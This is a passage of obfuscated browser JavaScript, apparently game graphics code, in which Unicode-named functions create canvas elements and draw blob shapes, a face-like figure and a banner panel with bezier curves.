			return Ⲇⵠ
		}

		function ᐃᐃᐃⲆⲆ(ᐃ, Ⲇᐃ, ⵠᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			if (ⵠⲆⲆ == ⵠᐃ) {
				Ⲇⵠ.width = 566 * ᐃ;
				Ⲇⵠ.height = ᐃ * 429;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[5];
				Δ.moveTo(ᐃ * 312.625, 39.046875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 456.625, 60.046875 * ᐃ, ᐃ * 521.625, ᐃ * 134.046875, 528.625 * ᐃ, 199.046875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 540.625, ᐃ * 298.046875, ᐃ * 491.625, 364.046875 * ᐃ, ᐃ * 405.625, 394.046875 * ᐃ);
				Δ.bezierCurveTo(270.625 * ᐃ, ᐃ * 429.046875, 182.625 * ᐃ, ᐃ * 395.046875, ᐃ * 100.625, ᐃ * 344.046875);
				Δ.bezierCurveTo(ᐃ * 15.625, ᐃ * 283.046875, ᐃ * 20.625, 195.046875 * ᐃ, 33.625 * ᐃ, ᐃ * 158.046875);
				Δ.bezierCurveTo(56.625 * ᐃ, 80.046875 * ᐃ, ᐃ * 102.625, 46.046875 * ᐃ, 183.625 * ᐃ, ᐃ * 33.046875);
				Δ.bezierCurveTo(225.625 * ᐃ, 25.046875 * ᐃ, 270.625 * ᐃ, 30.046875 * ᐃ, ᐃ * 312.625, ᐃ * 39.046875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			} else if (1 == ⵠᐃ) {
				var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				var Δ = Ⲇⵠ.getContext(ⵠ[289]);
				Ⲇⵠ.width = 511 * ᐃ;
				Ⲇⵠ.height = ᐃ * 408;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
				Δ.moveTo(141.625 * ᐃ, 49.296875 * ᐃ);
				Δ.bezierCurveTo(ᐃ * 225.625, ᐃ * 10.296875, ᐃ * 320.625, ᐃ * 16.296875, 390.625 * ᐃ, 39.296875 * ᐃ);
				Δ.bezierCurveTo(476.625 * ᐃ, 71.296875 * ᐃ, ᐃ * 483.625, ᐃ * 142.296875, ᐃ * 486.625, ᐃ * 197.296875);
				Δ.bezierCurveTo(491.625 * ᐃ, ᐃ * 289.296875, 462.625 * ᐃ, ᐃ * 317.296875, ᐃ * 417.625, 351.296875 * ᐃ);
				Δ.bezierCurveTo(367.625 * ᐃ, 385.296875 * ᐃ, ᐃ * 313.625, ᐃ * 404.296875, ᐃ * 218.625, ᐃ * 395.296875);
				Δ.bezierCurveTo(108.625 * ᐃ, 381.296875 * ᐃ, 81.625 * ᐃ, ᐃ * 350.296875, ᐃ * 52.625, ᐃ * 305.296875);
				Δ.bezierCurveTo(ᐃ * 16.625, 244.296875 * ᐃ, 23.625 * ᐃ, ᐃ * 171.296875, 37.625 * ᐃ, ᐃ * 145.296875);
				Δ.bezierCurveTo(65.625 * ᐃ, ᐃ * 84.296875, ᐃ * 97.625, ᐃ * 74.296875, 141.625 * ᐃ, ᐃ * 49.296875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[Ⲇᐃⵠⵠ])
			} else if (Ⲇⵠⵠᐃ == ⵠᐃ) {
				var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
				var Δ = Ⲇⵠ.getContext(ⵠ[289]);
				Ⲇⵠ.width = ᐃ * 504;
				Ⲇⵠ.height = 408 * ᐃ;
				Δ.beginPath();
				Δ.lineCap = ⵠ[5];
				Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
				Δ.moveTo(ᐃ * 153.625, 46.296875 * ᐃ);
				Δ.bezierCurveTo(271.625 * ᐃ, 17.296875 * ᐃ, ᐃ * 345.625, ᐃ * 35.296875, ᐃ * 410.625, ᐃ * 71.296875);
				Δ.bezierCurveTo(473.625 * ᐃ, ᐃ * 109.296875, 478.625 * ᐃ, 167.296875 * ᐃ, 473.625 * ᐃ, ᐃ * 205.296875);
				Δ.bezierCurveTo(462.625 * ᐃ, ᐃ * 295.296875, 438.625 * ᐃ, ᐃ * 316.296875, ᐃ * 388.625, 345.296875 * ᐃ);
				Δ.bezierCurveTo(331.625 * ᐃ, 374.296875 * ᐃ, ᐃ * 273.625, 392.296875 * ᐃ, ᐃ * 180.625, ᐃ * 387.296875);
				Δ.bezierCurveTo(111.625 * ᐃ, 380.296875 * ᐃ, ᐃ * 86.625, ᐃ * 360.296875, 51.625 * ᐃ, ᐃ * 309.296875);
				Δ.bezierCurveTo(23.625 * ᐃ, 267.296875 * ᐃ, ᐃ * 25.625, ᐃ * 226.296875, ᐃ * 27.625, ᐃ * 175.296875);
				Δ.bezierCurveTo(ᐃ * 37.625, ᐃ * 99.296875, ᐃ * 88.625, ᐃ * 57.296875, 153.625 * ᐃ, ᐃ * 46.296875);
				Δ.closePath();
				ΔⲆ(Δ, Ⲇᐃ[0])
			}
			return Ⲇⵠ
		}

		function ⵠⲆⵠᐃΔⲆᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 345 * ᐃ;
			Ⲇⵠ.height = ᐃ * 250;
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 105, ᐃ * 58);
			Δ.bezierCurveTo(ᐃ * 100.5, 43 * ᐃ, ᐃ * 100.5, ᐃ * 43, 96 * ᐃ, 28 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 119.5, 33.5 * ᐃ, ᐃ * 119.5, ᐃ * 33.5, ᐃ * 143, ᐃ * 39);
			Δ.bezierCurveTo(170 * ᐃ, 37 * ᐃ, 177 * ᐃ, ᐃ * 37, 188 * ᐃ, 40 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 213, ᐃ * 33.5, ᐃ * 213, 33.5 * ᐃ, 238 * ᐃ, 27 * ᐃ);
			Δ.bezierCurveTo(231 * ᐃ, 52 * ᐃ, 234 * ᐃ, 42.5 * ᐃ, 230 * ᐃ, 58 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[1], Ⲇᐃ[ⲆᐃᐃⲆ], ΔⵠⲆᐃⲆ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ᐃⲆⵠΔ];
			Δ.moveTo(ᐃ * 108, ᐃ * 51);
			Δ.bezierCurveTo(91 * ᐃ, 55 * ᐃ, 85 * ᐃ, 44 * ᐃ, 86 * ᐃ, 29 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62, 50 * ᐃ, ᐃ * 78, ᐃ * 69, ᐃ * 92, 75 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ΔᐃⲆΔ], Ⲇᐃ[4], ᐃᐃⵠᐃᐃΔΔ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔᐃΔⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 249, 27 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 273, 49 * ᐃ, ᐃ * 262, 68 * ᐃ, ᐃ * 246, 77 * ᐃ);
			Δ.bezierCurveTo(231 * ᐃ, ᐃ * 59, 236 * ᐃ, ᐃ * 66.5, ᐃ * 226, 56 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 243, 53 * ᐃ, 252 * ᐃ, ᐃ * 43, ᐃ * 249, ᐃ * 28);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⵠⲆΔᐃ], Ⲇᐃ[ⲆΔⵠᐃ], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ΔⵠⲆⲆ];
			Δ.moveTo(87 * ᐃ, ᐃ * 78);
			Δ.bezierCurveTo(87 * ᐃ, ᐃ * 59, ᐃ * 98, ᐃ * 46, 127 * ᐃ, ᐃ * 48);
			Δ.bezierCurveTo(ᐃ * 176, 48.5 * ᐃ, ᐃ * 176, 48.5 * ᐃ, 225 * ᐃ, 49 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 243, 49 * ᐃ, ᐃ * 253, 59 * ᐃ, 253 * ᐃ, ᐃ * 76);
			Δ.bezierCurveTo(ᐃ * 211, ᐃ * 85.5, 211 * ᐃ, 85.5 * ᐃ, ᐃ * 169, 95 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆⵠⵠ], Ⲇᐃ[6], ᐃ * 8);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(56 * ᐃ, ᐃ * 105);
			Δ.bezierCurveTo(56 * ᐃ, 92 * ᐃ, ᐃ * 59, ᐃ * 86, 65 * ᐃ, 73 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 62.5, 61.5 * ᐃ, ᐃ * 62.5, ᐃ * 61.5, ᐃ * 60, ᐃ * 50);
			Δ.bezierCurveTo(99.5 * ᐃ, ᐃ * 64.5, 99.5 * ᐃ, 64.5 * ᐃ, ᐃ * 139, ᐃ * 79);
			Δ.bezierCurveTo(164 * ᐃ, 77 * ᐃ, ᐃ * 177, ᐃ * 76, ᐃ * 203, ᐃ * 78);
			Δ.bezierCurveTo(ᐃ * 242, 63.5 * ᐃ, 242 * ᐃ, ᐃ * 63.5, ᐃ * 281, 49 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 279, ᐃ * 60.5, ᐃ * 279, 60.5 * ᐃ, 277 * ᐃ, 72 * ᐃ);
			Δ.bezierCurveTo(286 * ᐃ, 88 * ᐃ, ᐃ * 286, ᐃ * 96, 287 * ᐃ, ᐃ * 104);
			Δ.bezierCurveTo(ᐃ * 228.5, 127 * ᐃ, ᐃ * 228.5, 127 * ᐃ, 170 * ᐃ, 150 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔ], Ⲇᐃ[2], ΔᐃᐃⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ᐃΔΔΔ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(48 * ᐃ, ᐃ * 130);
			Δ.bezierCurveTo(61 * ᐃ, 155 * ᐃ, 63 * ᐃ, 165 * ᐃ, 56 * ᐃ, ᐃ * 171);
			Δ.bezierCurveTo(48 * ᐃ, 177 * ᐃ, 40 * ᐃ, ᐃ * 171, ᐃ * 38, 178 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 33, 180 * ᐃ, 37 * ᐃ, ᐃ * 188, 47 * ᐃ, 208 * ᐃ);
			Δ.bezierCurveTo(52 * ᐃ, ᐃ * 221, ᐃ * 55, 222 * ᐃ, 75 * ᐃ, 229 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 91, 213 * ᐃ, 98 * ᐃ, 212 * ᐃ, ᐃ * 112, 219 * ᐃ);
			Δ.bezierCurveTo(167 * ᐃ, 225 * ᐃ, ᐃ * 187, ᐃ * 224, ᐃ * 222, 220 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 244, ᐃ * 214, 247 * ᐃ, ᐃ * 213, ᐃ * 263, 229 * ᐃ);
			Δ.bezierCurveTo(295 * ᐃ, 220 * ᐃ, 291 * ᐃ, ᐃ * 215, ᐃ * 301, 194 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 308, ᐃ * 178, ᐃ * 309, ᐃ * 176, ᐃ * 302, ᐃ * 173);
			Δ.bezierCurveTo(ᐃ * 290, 177 * ᐃ, 289 * ᐃ, ᐃ * 177, 283 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(279 * ᐃ, ᐃ * 163, 279 * ᐃ, 161 * ᐃ, ᐃ * 290, ᐃ * 130);
			Δ.bezierCurveTo(ᐃ * 270, ᐃ * 127, ᐃ * 270, 127 * ᐃ, ᐃ * 250, 124 * ᐃ);
			Δ.bezierCurveTo(209 * ᐃ, ᐃ * 137.5, ᐃ * 209, ᐃ * 137.5, ᐃ * 168, 151 * ᐃ);
			Δ.bezierCurveTo(121 * ᐃ, ᐃ * 135, ᐃ * 121, ᐃ * 135, 74 * ᐃ, 119 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⵠ], Ⲇᐃ[2], ᐃ * 8);
			Δ.globalCompositeOperation = ⵠ[172];
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆⲆΔⵠ];
			Δ.moveTo(133 * ᐃ, 158 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 152, ᐃ * 193, ᐃ * 158, ᐃ * 205, 140 * ᐃ, 203 * ᐃ);
			Δ.bezierCurveTo(99 * ᐃ, 195 * ᐃ, ᐃ * 96, ᐃ * 189, 86 * ᐃ, ᐃ * 173);
			Δ.bezierCurveTo(ᐃ * 80, ᐃ * 159, ᐃ * 88, ᐃ * 145, 104 * ᐃ, 141 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[7], Ⲇᐃ[8], 8 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[ⲆΔⲆᐃ];
			Δ.moveTo(ᐃ * 215, 146 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 204, ᐃ * 167, 204 * ᐃ, 167 * ᐃ, 193 * ᐃ, 188 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 187, 201 * ᐃ, 191 * ᐃ, ᐃ * 209, ᐃ * 213, ᐃ * 201);
			Δ.bezierCurveTo(247 * ᐃ, ᐃ * 192, 253 * ᐃ, ᐃ * 181, ᐃ * 257, 169 * ᐃ);
			Δ.bezierCurveTo(260 * ᐃ, 157 * ᐃ, ᐃ * 254, 149 * ᐃ, ᐃ * 243, ᐃ * 141);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠᐃⵠᐃΔΔΔ], Ⲇᐃ[8], ᐃ * 8);
			Δ.globalCompositeOperation = ⵠ[512];
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 133, 158 * ᐃ);
			Δ.bezierCurveTo(152 * ᐃ, 193 * ᐃ, 158 * ᐃ, 205 * ᐃ, ᐃ * 140, 203 * ᐃ);
			Δ.bezierCurveTo(99 * ᐃ, 195 * ᐃ, 96 * ᐃ, ᐃ * 189, 86 * ᐃ, 173 * ᐃ);
			Δ.bezierCurveTo(80 * ᐃ, 159 * ᐃ, 88 * ᐃ, ᐃ * 145, 104 * ᐃ, 141 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⵠⲆᐃⲆ], ᐃⵠⲆᐃᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⲆΔⲆᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 215, ᐃ * 146);
			Δ.bezierCurveTo(ᐃ * 204, 167 * ᐃ, 204 * ᐃ, 167 * ᐃ, 193 * ᐃ, 188 * ᐃ);
			Δ.bezierCurveTo(187 * ᐃ, 201 * ᐃ, 191 * ᐃ, ᐃ * 209, 213 * ᐃ, ᐃ * 201);
			Δ.bezierCurveTo(ᐃ * 247, 192 * ᐃ, ᐃ * 253, ᐃ * 181, 257 * ᐃ, ᐃ * 169);
			Δ.bezierCurveTo(260 * ᐃ, ᐃ * 157, 254 * ᐃ, 149 * ᐃ, 243 * ᐃ, ᐃ * 141);
			Δ.closePath();
			ΔⲆ(Δ, undefined, Ⲇᐃ[ΔⵠⲆᐃⲆ], ⵠⵠⵠΔᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 39, ᐃ * 66);
			Δ.bezierCurveTo(57 * ᐃ, 107 * ᐃ, 63 * ᐃ, ᐃ * 96, ᐃ * 120, 106 * ᐃ);
			Δ.bezierCurveTo(154 * ᐃ, ᐃ * 112, 163 * ᐃ, 116 * ᐃ, 174 * ᐃ, 135 * ᐃ);
			Δ.bezierCurveTo(180 * ᐃ, ᐃ * 109, ᐃ * 191, ᐃ * 113, ᐃ * 237, ᐃ * 103);
			Δ.bezierCurveTo(ᐃ * 276, 100 * ᐃ, ᐃ * 289, 94 * ᐃ, 301 * ᐃ, 67 * ᐃ);
			Δ.bezierCurveTo(317 * ᐃ, 112 * ᐃ, 301 * ᐃ, ᐃ * 141, 274 * ᐃ, ᐃ * 139);
			Δ.bezierCurveTo(ᐃ * 204, ᐃ * 166, 197 * ᐃ, ᐃ * 169, 173 * ᐃ, ᐃ * 183);
			Δ.bezierCurveTo(ᐃ * 170, ᐃ * 183, 170 * ᐃ, 183 * ᐃ, ᐃ * 167, ᐃ * 183);
			Δ.bezierCurveTo(ᐃ * 132, 160 * ᐃ, 112 * ᐃ, 156 * ᐃ, ᐃ * 73, 141 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 43, ᐃ * 146, ᐃ * 27, 120 * ᐃ, ᐃ * 39, 66 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆⲆⵠⲆⵠ], Ⲇᐃ[8], ᐃ * ⵠᐃΔΔᐃⲆⵠ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔⵠⲆⲆ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(115 * ᐃ, ᐃ * 185);
			Δ.bezierCurveTo(ᐃ * 115, ᐃ * 200, ᐃ * 118, ᐃ * 206, 124 * ᐃ, ᐃ * 212);
			Δ.bezierCurveTo(133 * ᐃ, 223 * ᐃ, 132 * ᐃ, ᐃ * 231, 121 * ᐃ, ᐃ * 230);
			Δ.bezierCurveTo(ᐃ * 108, 226 * ᐃ, 108 * ᐃ, ᐃ * 215, 107 * ᐃ, ᐃ * 209);
			Δ.bezierCurveTo(ᐃ * 106, 201 * ᐃ, ᐃ * 110, 196 * ᐃ, ᐃ * 114, 185 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[4], Δᐃⵠⵠⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⲆᐃᐃ];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 226, 186 * ᐃ);
			Δ.bezierCurveTo(234 * ᐃ, 201 * ᐃ, 238 * ᐃ, 209 * ᐃ, 228 * ᐃ, 225 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 223, 233 * ᐃ, 213 * ᐃ, 233 * ᐃ, 211 * ᐃ, 226 * ᐃ);
			Δ.bezierCurveTo(206 * ᐃ, 219 * ᐃ, ᐃ * 217, 216 * ᐃ, ᐃ * 221, 207 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 225, 196 * ᐃ, 225 * ᐃ, 191 * ᐃ, ᐃ * 226, ᐃ * 186);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⵠⲆΔⵠΔ], Ⲇᐃ[4], ⲆᐃΔⲆⵠ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(172 * ᐃ, ᐃ * 110);
			Δ.bezierCurveTo(189 * ᐃ, 153 * ᐃ, ᐃ * 192, 160 * ᐃ, ᐃ * 188, 175 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 183, ᐃ * 190, ᐃ * 176, ᐃ * 197, ᐃ * 165, ᐃ * 191);
			Δ.bezierCurveTo(ᐃ * 153, 181 * ᐃ, 152 * ᐃ, ᐃ * 166, ᐃ * 157, ᐃ * 151);
			Δ.bezierCurveTo(ᐃ * 164.5, ᐃ * 131, 164.5 * ᐃ, ᐃ * 131, ᐃ * 172, ᐃ * 111);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ᐃⲆᐃᐃ], Ⲇᐃ[4], ΔᐃᐃⲆᐃ * ᐃ);
			return Ⲇⵠ
		}

		function ΔⲆᐃⲆⵠⵠᐃ(ᐃ, ᐃΔⲆΔ, Ⲇᐃ) {
			var Ⲇⵠ = document[ΔᐃⲆⵠⲆⵠΔ[224]](ⵠ[488]);
			var Δ = Ⲇⵠ.getContext(ⵠ[289]);
			Ⲇⵠ.width = 450 * ᐃ;
			Ⲇⵠ.height = 260 * ᐃ;
			Δ.translate(ᐃ * ⲆⲆᐃΔΔ, 10 * ᐃ);
			Δ.globalAlpha = ᐃΔⲆΔ ? .5 : 1;
			Δ.translate(ᐃ * 20, 20 * ᐃ);
			Ⲇᐃᐃ(Δ, 0, 0, ᐃ * 400, 220 * ᐃ, ᐃ * 30);
			ΔⲆ(Δ, Ⲇᐃ[0]);
			Δ.globalAlpha = ΔΔΔ;
			Δ.translate(ᐃ * -Δⵠᐃᐃᐃ, -ⵠΔΔⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[5];
			Δ.lineJoin = ⵠ[5];
			Δ.moveTo(ᐃ * 9, ᐃ * 5);
			Δ.bezierCurveTo(381 * ᐃ, ᐃⲆΔⲆ * ᐃ, ᐃ * 197, ᐃ * 4.5, ᐃ * 385, ᐃ * ⲆⵠᐃⲆ);
			Δ.bezierCurveTo(397 * ᐃ, 4 * ᐃ, ᐃ * 401, ⲆⵠᐃΔ * ᐃ, 399 * ᐃ, 23 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 367, 27 * ᐃ, 367 * ᐃ, ᐃ * 27, ᐃ * 335, ᐃ * 31);
			Δ.bezierCurveTo(ᐃ * 366.5, 33.5 * ᐃ, 366.5 * ᐃ, ᐃ * 33.5, 398 * ᐃ, 36 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 398, 41.5 * ᐃ, 398 * ᐃ, ᐃ * 41.5, 398 * ᐃ, 47 * ᐃ);
			Δ.bezierCurveTo(398 * ᐃ, 56 * ᐃ, ᐃ * 399, 56 * ᐃ, 386 * ᐃ, ᐃ * 56);
			Δ.bezierCurveTo(ᐃ * 200.5, 56.5 * ᐃ, 200.5 * ᐃ, 56.5 * ᐃ, ᐃ * 15, ᐃ * 57);
			Δ.bezierCurveTo(2 * ᐃ, 55 * ᐃ, ᐃ * 4, 52 * ᐃ, 4 * ᐃ, 43 * ᐃ);
			Δ.bezierCurveTo(4 * ᐃ, 30.5 * ᐃ, 4 * ᐃ, 30.5 * ᐃ, ᐃ * 4, ᐃΔΔⵠᐃ * ᐃ);
			Δ.bezierCurveTo(ΔⲆⵠⵠᐃⲆΔ * ᐃ, ᐃ * 18.5, ᐃ * ᐃⲆᐃᐃΔ, 18.5 * ᐃ, 28 * ᐃ, 19 * ᐃ);
			Δ.bezierCurveTo(18.5 * ᐃ, 12 * ᐃ, 18.5 * ᐃ, ᐃ * ⲆΔⲆΔⲆ, ⲆΔⲆΔⵠ * ᐃ, ᐃΔΔΔ * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ΔΔᐃⵠ], ᐃⲆⲆΔΔⲆᐃ * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠⵠΔⵠ];
			Δ.lineJoin = ⵠ[ᐃΔΔⲆ];
			Δ.moveTo(ᐃ * ᐃΔΔΔ, 70 * ᐃ);
			Δ.bezierCurveTo(5 * ᐃ, ᐃ * 58, ᐃ * ᐃΔΔΔ, ᐃ * 55, 17 * ᐃ, ᐃ * 57);
			Δ.bezierCurveTo(203 * ᐃ, ᐃ * 57, 203 * ᐃ, 57 * ᐃ, ᐃ * 389, 57 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 400, ᐃ * 57, ᐃ * 400, ᐃ * 59, 400 * ᐃ, 69 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 400.5, 83.5 * ᐃ, 400.5 * ᐃ, 83.5 * ᐃ, 401 * ᐃ, ᐃ * 98);
			Δ.bezierCurveTo(ᐃ * 402, 108 * ᐃ, ᐃ * 401, 108 * ᐃ, ᐃ * 388, 108 * ᐃ);
			Δ.bezierCurveTo(201.5 * ᐃ, ᐃ * 108, ᐃ * 201.5, ᐃ * 108, ΔⵠⵠᐃΔᐃⲆ * ᐃ, ᐃ * 108);
			Δ.bezierCurveTo(ᐃ * 1, 106 * ᐃ, 5 * ᐃ, ᐃ * 106, ᐃ * 5, ᐃ * 87);
			Δ.bezierCurveTo(33 * ᐃ, ᐃ * 84.5, ᐃ * 33, ᐃ * 84.5, 61 * ᐃ, ᐃ * 82);
			Δ.bezierCurveTo(ᐃ * 33.5, 76.5 * ᐃ, ᐃ * 33.5, 76.5 * ᐃ, ᐃⵠⲆⵠΔ * ᐃ, ᐃ * 71);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[ⲆΔⵠⵠ], Ⲇᐃ[ΔⲆᐃᐃ], ᐃ * 12);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ΔΔᐃⲆ];
			Δ.lineJoin = ⵠ[ⵠⵠΔⵠ];
			Δ.moveTo(ᐃ * ᐃΔⲆΔⵠ, ᐃ * 158);
			Δ.bezierCurveTo(ᐃ * 2, ᐃ * 159, ᐃ * ΔΔⵠⵠΔ, ᐃ * 156, ᐃ * ᐃᐃⲆᐃ, 118 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 4, ᐃ * 110, ᐃ * 6, ᐃ * 107, ᐃ * 26, 109 * ᐃ);
			Δ.bezierCurveTo(206.5 * ᐃ, 109 * ᐃ, ᐃ * 206.5, 109 * ᐃ, ᐃ * 387, 109 * ᐃ);
			Δ.bezierCurveTo(400 * ᐃ, 108 * ᐃ, 400 * ᐃ, 108 * ᐃ, 398 * ᐃ, ᐃ * 127);
			Δ.bezierCurveTo(ᐃ * 384.5, ᐃ * 130, 384.5 * ᐃ, ᐃ * 130, 371 * ᐃ, ᐃ * 133);
			Δ.bezierCurveTo(ᐃ * 385.5, ᐃ * 138, 385.5 * ᐃ, ᐃ * 138, ᐃ * 400, 143 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 402, ᐃ * 156, 402 * ᐃ, ᐃ * 162, 385 * ᐃ, 160 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[2], Ⲇᐃ[ⵠⲆΔ], 12 * ᐃ);
			Δ.beginPath();
			Δ.lineCap = ⵠ[ⵠᐃⲆΔ];
			Δ.lineJoin = ⵠ[ᐃΔΔΔ];
			Δ.moveTo(ᐃ * ᐃⲆᐃⲆⵠ, ᐃ * 183);
			Δ.bezierCurveTo(ᐃ * ⵠΔⲆ, ᐃ * 163, ΔⲆⲆⲆ * ᐃ, ᐃ * 158, ᐃ * 28, ᐃ * 161);
			Δ.bezierCurveTo(207.5 * ᐃ, ᐃ * 161, 207.5 * ᐃ, 161 * ᐃ, 387 * ᐃ, 161 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 401, ᐃ * 159, 400 * ᐃ, ᐃ * 164, ᐃ * 400, ᐃ * 177);
			Δ.bezierCurveTo(364.5 * ᐃ, ᐃ * 184, 364.5 * ᐃ, ᐃ * 184, ᐃ * 329, 191 * ᐃ);
			Δ.bezierCurveTo(364.5 * ᐃ, 192.5 * ᐃ, 364.5 * ᐃ, 192.5 * ᐃ, 400 * ᐃ, ᐃ * 194);
			Δ.bezierCurveTo(ᐃ * 403, ᐃ * 209, ᐃ * 401, ᐃ * 214, 385 * ᐃ, 213 * ᐃ);
			Δ.bezierCurveTo(ᐃ * 201.5, 213 * ᐃ, ᐃ * 201.5, ᐃ * 213, 18 * ᐃ, ᐃ * 213);
			Δ.bezierCurveTo(ᐃ * 3, 213 * ᐃ, ᐃ * 2, 213 * ᐃ, ᐃ * ⲆⵠᐃⲆ, ᐃ * 198);
			Δ.bezierCurveTo(ᐃ * 12.5, ᐃ * 193, ᐃ * 12.5, ᐃ * 193, 21 * ᐃ, 188 * ᐃ);
			Δ.closePath();
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃ * ᐃᐃΔᐃⲆ);
			ⵠᐃᐃ(Δ, 41 * ᐃ, 30 * ᐃ, 14.7648230602334 * ᐃ);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[ΔⲆᐃᐃ], ᐃ * ⵠⲆᐃᐃⲆ);
			ⵠᐃᐃ(Δ, 369 * ᐃ, ᐃ * 30, ᐃ * 15.556349186104045);
			ΔⲆ(Δ, Ⲇᐃ[3], Ⲇᐃ[1], ᐃⲆⲆΔⵠ * ᐃ);
			ⵠᐃᐃ(Δ, ᐃ * 364, 190 * ᐃ, ᐃ * 15.620499351813308);
			ΔⲆ(Δ, Ⲇᐃ[ⵠΔΔΔΔ], Ⲇᐃ[1], ⲆΔⲆΔⲆ * ᐃ);
			ⵠᐃᐃ(Δ, 41 * ᐃ, ᐃ * 186, ᐃ * 15.556349186104045);
			ΔⲆ(Δ, Ⲇᐃ[ᐃᐃⲆΔⵠ], Ⲇᐃ[ΔΔΔ], ᐃ * 12);
			return Ⲇⵠ
		}

		function ΔΔⵠⵠᐃⵠⵠⵠᐃ(ᐃ) {
